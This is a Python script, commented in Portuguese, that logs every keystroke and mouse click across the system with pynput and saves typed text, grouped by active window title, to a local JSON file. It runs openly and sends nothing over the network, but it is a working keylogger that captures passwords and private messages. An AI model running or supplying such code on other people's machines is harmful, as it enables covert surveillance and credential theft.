import time
import json
from datetime import datetime
from pynput import keyboard, mouse
import pygetwindow as gw

LOG_FILE = "activity_log.json"

# Buffer global para acumular texto digitado
current_text = ""
current_window = None

def get_active_window_title():
    """Retorna o título da janela ativa (ou 'Unknown' se não for possível)."""
    try:
        window = gw.getActiveWindow()
        if window is not None:
            return window.title
        return "Unknown"
    except Exception:
        return "Unknown"

def log_event(event_type, data):
    """Registra um evento no arquivo de log."""
    entry = {
        "timestamp": datetime.now().isoformat(),
        "type": event_type,
        "window": current_window if event_type == "text" else get_active_window_title(),
        "data": data
    }
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")

def flush_text():
    """Grava o texto acumulado (se houver) e limpa o buffer."""
    global current_text, current_window
    if current_text:
        log_event("text", {"text": current_text})
        current_text = ""
    current_window = None

def on_press(key):
    global current_text, current_window

    # Obtém a janela ativa atual
    active_window = get_active_window_title()

    # Se a janela mudou desde o último caractere, finaliza o texto anterior
    if current_window is not None and active_window != current_window:
        flush_text()

    # Define a janela atual para o buffer (se não houver buffer ativo)
    if current_window is None and current_text == "":
        current_window = active_window

    # Tratamento das teclas especiais
    if key == keyboard.Key.enter:
        flush_text()
        return

    if key == keyboard.Key.backspace:
        if current_text:
            current_text = current_text[:-1]
        return

    if key == keyboard.Key.space:
        current_text += " "
        return

    # Para outras teclas especiais (tab, esc, etc.) você pode adicionar:
    # if key == keyboard.Key.tab:
    #     current_text += "\t"
    #     return

    # Se for uma tecla de caractere imprimível
    if hasattr(key, 'char') and key.char is not None:
        current_text += key.char

def on_click(x, y, button, pressed):
    """Callback para cliques do mouse."""
    if pressed:
        # Antes de registrar o clique, finaliza texto pendente
        flush_text()
        button_name = str(button).split('.')[-1]  # ex: 'left', 'right', 'middle'
        log_event("mouse", {
            "button": button_name,
            "position": (x, y),
            "action": "click"
        })

def main():
    print("Monitoramento iniciado. Pressione Ctrl+C para encerrar.")
    print(f"Os eventos estão sendo salvos em: {LOG_FILE}")

    keyboard_listener = keyboard.Listener(on_press=on_press)
    keyboard_listener.start()

    mouse_listener = mouse.Listener(on_click=on_click)
    mouse_listener.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nMonitoramento encerrado.")
        flush_text()  # Garante que texto pendente seja salvo ao sair
        keyboard_listener.stop()
        mouse_listener.stop()

if __name__ == "__main__":
    main()